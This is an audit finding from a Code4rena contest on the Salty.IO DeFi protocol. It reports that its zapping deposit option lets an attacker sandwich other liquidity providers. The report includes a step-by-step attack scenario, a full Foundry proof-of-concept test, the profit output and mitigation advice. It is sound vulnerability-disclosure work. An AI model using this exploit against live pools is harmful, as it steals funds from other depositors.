# [M] Adding liquidity with `useZapping = true` allows user to steal funds

## Summary
Severity: Medium
Chain: Smart contract
Component: 2024-03-saltyio-mitigation
Published: 2024-03-11
Source: https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/127
Type: code-finding

## Details
# Lines of code

https://github.com/othernet-global/salty-io/blob/main/src/staking/Liquidity.sol#L88-L89


# Vulnerability details

## Summary
The function [depositLiquidityAndIncreaseShare() can be called with useZapping = true](https://github.com/othernet-global/salty-io/blob/main/src/staking/Liquidity.sol#L88-L89) which internally swaps one token to another in order to maintain the correct ratio and then makes the deposit. This can be exploited to gain funds.

## Details
The protocol has taken important steps which either make a traditional sandwich attack unprofitable for the attacker or impossible to execute altogether. These are -
- AAA i.e. the internal atomic arb.
- [Limiting user swaps to one per block to prevent bypassing arbitrage within a single block](https://github.com/code-423n4/2024-03-saltyio-mitigation?tab=readme-ov-file#:~:text=Limited%20user%20swaps%20to%20one%20per%20block%20to%20prevent%20bypassing%20arbitrage%20within%20a%20single%20block). This also makes sure that a malicious user can not perform a sandwich attack by front-running another user's liquidity addition. The malicious front-run-swap and later on the back-run-swap won't be allowed by the protocol in a single block.

These constraints are however bypassed by calling the function `depositLiquidityAndIncreaseShare()` with `useZapping = true`.
<br>

Instead of doing a front-run-swap, simply let the zapping feature do it for you. This internal swap is not recorded as an actual "swap" by the protocol and hence when later on a back-run-swap is executed, it's not reverted in spite of being in the same block. Additionally, [arbitrage no longer occurs when zapping liquidity](https://github.com/code-423n4/2024-03-saltyio-mitigation?tab=readme-ov-file#:~:text=Arbitrage%20no%20longer%20occurs%20when%20zapping%20liquidity), as implemented in [this PR](https://github.com/othernet-global/salty-io/commit/f16623e6bf1cdb0845b83ebf3592e30885a8fc61). So you have now bypassed AAA as well. 

## Attack Scenario
- In a pool of `token1` and `token2`, the fair ratio to be maintained for `token1:token2` is `1:1`. One can imagine that `1 wei` of each token = `$1`.
- The first depositor, Alice calls `depositLiquidityAndIncreaseShare(token, token2, 100 ether, 100 ether, 100 ether, 100 ether, 200 ether, block.timestamp, false)` to deposit `100 ether` of each token with proper slippage parameters. She gets `2 * 100 ether = 200e18` shares.
- Another depositor, Charlie calls `depositLiquidityAndIncreaseShare( token1, token2, 100 ether, 100 ether, 100 ether, 99 ether, 199 ether, block.timestamp, false )` to attempt a deposit of `100 ether` of each token. He understands that in a dynamic market various swaps might be happening at the same time, effecting the price ratios, hence provides a slippage of around `1%` for token2 by specifying minimum token2 as `99 ether` and minimum shares as `199 ether`. He does not tolerate any slippage for token1 in our example.
- Bob, who is a malicious user, front-runs Charlie and calls `depositLiquidityAndIncreaseShare( token1, token2, 1 ether, 0, 0, 0, 0, block.timestamp, true )` to add `1 ether` of token1 with `useZapping = true`.
- The protocol makes the internal swap. If we inspect the reserves after this, we find:
```js
  new balances: token1 = 100999999999999999999, token2 = 100000000000000000000
  Manipulated ratio of token2:token1 =: 0.990099009900990099
```
- The internal zap-swap has resulted in the ratios to change.
  - **Note that** Bob can use multiple alternate accounts of his to call `depositLiquidityAndIncreaseShare()` with `useZapping = true` multiple times. This would skew the ratio even further. He just needs to take care to be within the slippage limits set by Charlie.
- Charlie's transaction goes through after Bob's transaction. His slippage parameters were invoked.
- Bob now swaps `1 ether` of token2 for token1. He calls `depositSwapWithdraw(token2, token1, 1 ether, 0, block.timestamp)` and receives `1.004950249987624375 ether` of token1, higher than the market rate of `1 ether`.
- Bob now withdraws his entire liquidity shares to make a profit of `$2462673092946115`.

## Impact
Bob can steal funds from Charlie and profit.

## Proof of Concept

<details><summary>Click to view PoC</summary>

Create a new file `src/staking/tests/ZapSwap.t.sol` with the following code and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_t0x1c_ZapSwapGain`:
```js
// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.22;

import "../../dev/Deployment.sol";


contract ZapSwap is Deployment
{
	bytes32[] public poolIDs;
	bytes32 public pool1;

	IERC20 public token1;
	IERC20 public token2;

	address public constant alice = address(0x1111);
	address public constant bob = address(0x2222);
	address public constant charlie = address(0x3333);

	uint256 token1DecimalPrecision;
	uint256 token2DecimalPrecision;

	function setUp() public
	{
		// If $COVERAGE=yes, create an instance of the contract so that coverage testing can work
		// Otherwise, what is tested is the actual deployed contract on the blockchain (as specified in Deployment.sol)
		if ( keccak256(bytes(vm.envString("COVERAGE" ))) == keccak256(bytes("yes" )))
			initializeContracts();


		grantAccessAlice();
		grantAccessBob();
		grantAccessCharlie();
		grantAccessDeployer();
		grantAccessDefault();

		finalizeBootstrap();

		vm.prank(address(daoVestingWallet));
		salt.transfer(DEPLOYER, 1000000 ether);

		token1DecimalPrecision = 18;
		token2DecimalPrecision = 18;

		token1 = new TestERC20("TEST", token1DecimalPrecision);
		token2 = new TestERC20("TEST", token2DecimalPrecision);

		pool1 = PoolUtils._poolID(token1, token2);

		poolIDs = new bytes32[](1);
		poolIDs[0] = pool1;

		// Whitelist the _pools
		vm.startPrank( address(dao) );
		poolsConfig.whitelistPool(token1, token2);
		vm.stopPrank();

		vm.prank(DEPLOYER);
		salt.transfer( address(this), 100000 ether );


		salt.approve(address(liquidity), type(uint256).max);

		vm.startPrank(alice);
		token1.approve(address(liquidity), type(uint256).max);
		token2.approve(address(liquidity), type(uint256).max);
		vm.stopPrank();

		vm.startPrank(bob);
		token1.approve(address(liquidity), type(uint256).max);
		token2.approve(address(liquidity), type(uint256).max);
		token1.approve(address(pools), type(uint256).max);
		token2.approve(address(pools), type(uint256).max);
		vm.stopPrank();

		vm.startPrank(charlie);
		token1.approve(address(liquidity), type(uint256).max);
		token2.approve(address(liquidity), type(uint256).max);
		token1.approve(address(pools), type(uint256).max);
		token2.approve(address(pools), type(uint256).max);
		vm.stopPrank();

		// DAO gets some salt and pool lps and approves max to staking
		token1.transfer(address(dao), 1000 * 10**token1DecimalPrecision);
		token2.transfer(address(dao), 1000 * 10**token2DecimalPrecision);
		vm.startPrank(address(dao));
		token1.approve(address(liquidity), type(uint256).max);
		token2.approve(address(liquidity), type(uint256).max);
		vm.stopPrank();
	}

	// Convenience function
	function totalSharesForPool( bytes32 poolID ) public view returns (uint256)
	{
		bytes32[] memory _pools2 = new bytes32[](1);
		_pools2[0] = poolID;

		return liquidity.totalSharesForPools(_pools2)[0];
	}
	
	function test_t0x1c_ZapSwapGain() public {  
		// ******************************* SETUP **************************************
		// Give Alice, Bob & Charlie some tokens for testing
		token1.transfer(alice, 100 ether);
		token2.transfer(alice, 100 ether);
		token1.transfer(bob, 1 ether);
		token2.transfer(bob, 1 ether);
		token1.transfer(charlie, 100 ether);
		token2.transfer(charlie, 100 ether);

		assertEq(totalSharesForPool( pool1 ), 0, "Pool should initially have zero liquidity share" );
		assertEq(liquidity.userShareForPool(alice, pool1), 0, "Bob's initial liquidity share should be zero");
		assertEq(liquidity.userShareForPool(bob, pool1), 0, "Bob's initial liquidity share should be zero");
		assertEq(liquidity.userShareForPool(charlie, pool1), 0, "Charlie's initial liquidity share should be zero");
		assertEq( token1.balanceOf( address(pools)), 0, "liquidity should start with zero token1" );
		assertEq( token2.balanceOf( address(pools)), 0, "liquidity should start with zero token2" );

		// deposit ratio of 1:1 i.e token1's price is 1 times that of token2
		uint256 addedAmount1 = 100 ether;
		uint256 addedAmount2 = 100 ether;

		// Alice adds liquidity in the correct ratio, as the first depositor
		vm.prank(alice);
		uint256 addedLiquidityAlice = liquidity.depositLiquidityAndIncreaseShare( token1, token2, addedAmount1, addedAmount2, addedAmount1, addedAmount2, addedAmount1 + addedAmount2, block.timestamp, false );
		console.log("initial balances: token1 = %s, token2 = %s", token1.balanceOf( address(pools)), token2.balanceOf( address(pools)));
		emit log_named_decimal_uint ("Initial ratio of token2:token1 =", 1e18 * token2.balanceOf(address(pools)) / token1.balanceOf(address(pools)), 18);

		assertEq(liquidity.userShareForPool(alice, pool1), addedLiquidityAlice, "Alice's share should have increased" );
		assertEq( token1.balanceOf( address(pools)), addedAmount1, "Tokens were not deposited into the pool as expected" );
		assertEq( token2.balanceOf( address(pools)), addedAmount2, "Tokens were not deposited into the pool as expected" );
		assertEq(totalSharesForPool( pool1 ), addedLiquidityAlice, "totalShares mismatch after Alice's deposit" );
		uint256 bobInitialBalance = token1.balanceOf(bob) + token2.balanceOf(bob); // In Dollar terms
		// ******************************* SETUP ENDS **************************************
		
		console.log("\n\n***************************** Bob Zap-Swap Attack ************************************\n");

		vm.prank(bob);
		uint256 addedLiquidityBob = liquidity.depositLiquidityAndIncreaseShare( token1, token2, 1 ether, 0, 0, 0, 0, block.timestamp, true );
		console.log("new balances: token1 = %s, token2 = %s", token1.balanceOf( address(pools)), token2.balanceOf( address(pools)));
		emit log_named_decimal_uint ("Manipulated ratio of token2:token1 =", 1e18 * token2.balanceOf(address(pools)) / token1.balanceOf(address(pools)), 18);

		// Charlie transaction goes through now which adds liquidity with suitable slippage parameters
		vm.prank(charlie);
		// @audit-info : 1% slippage for token2
		liquidity.depositLiquidityAndIncreaseShare( token1, token2, 100 ether, 100 ether, 100 ether, 99 ether, 199 ether, block.timestamp, false );

		// Bob swaps
		vm.prank(bob);
		(uint256 swappedOut) = pools.depositSwapWithdraw(token2, token1, 1 ether, 0, block.timestamp);
		emit log_named_decimal_uint("token1 swappedOut in exchange for 1 ether of token2 (should be greater than 1 ether) =", swappedOut, 18);

		skip(1 hours);
		vm.prank(bob);
		liquidity.withdrawLiquidityAndClaim(token1, token2, addedLiquidityBob, 0, 0, block.timestamp);

		uint256 bobFinalBalance = token1.balanceOf(bob) + token2.balanceOf(bob); // In Dollar terms
		assertGt( bobFinalBalance, bobInitialBalance, "Bob did not profit" );
		console.log("\nProfit made by Bob = $", bobFinalBalance - bobInitialBalance);
	}
}
```

</details>

<br>

Output:
```js
[PASS] test_t0x1c_ZapSwapGain() (gas: 947570)
Logs:
  initial balances: token1 = 100000000000000000000, token2 = 100000000000000000000
  Initial ratio of token2:token1 =: 1.000000000000000000


***************************** Bob Zap-Swap Attack ************************************

  new balances: token1 = 100999999999999999999, token2 = 100000000000000000000
  Manipulated ratio of token2:token1 =: 0.990099009900990099

  token1 swappedOut in exchange for 1 ether of token2 (should be greater than 1 ether) =: 1.004950249987624375

Profit made by Bob = $ 2462673092946115
```

<br>
<br>

## Recommended Mitigation Steps
The `useZapping = true` option gives users the power to perform multiple actions which are otherwise actively blocked by the protocol individually. I would recommend to remove the zap functionality altogether. Removing this along with the fixes proposed in the following bug reports + the newly added features by the protocol should be sufficient to thwart any sandwich attacks via reserve ratio manipulation:
- Report titled _"Rounding loophole while adding liquidity can be exploited to steal value"_
- Report titled _"`removeLiquidity()` executes unbalanced token removal due to rounding bug, allowing user to steal funds"_
- _"Limited user swaps to one per block to prevent bypassing arbitrage within a single block"_ implemented in [this PR](https://github.com/othernet-global/salty-io/commit/2d1b7df004394720c0d8bb4aefe903021631eff3) (under _Extra scope_ [E5](https://github.com/code-423n4/2024-03-saltyio-mitigation?tab=readme-ov-file#:~:text=Limited%20user%20swaps%20to%20one%20per%20block%20to%20prevent%20bypassing%20arbitrage%20within%20a%20single%20block)).
- Salty's inherent AAA.





## Assessed type

Math
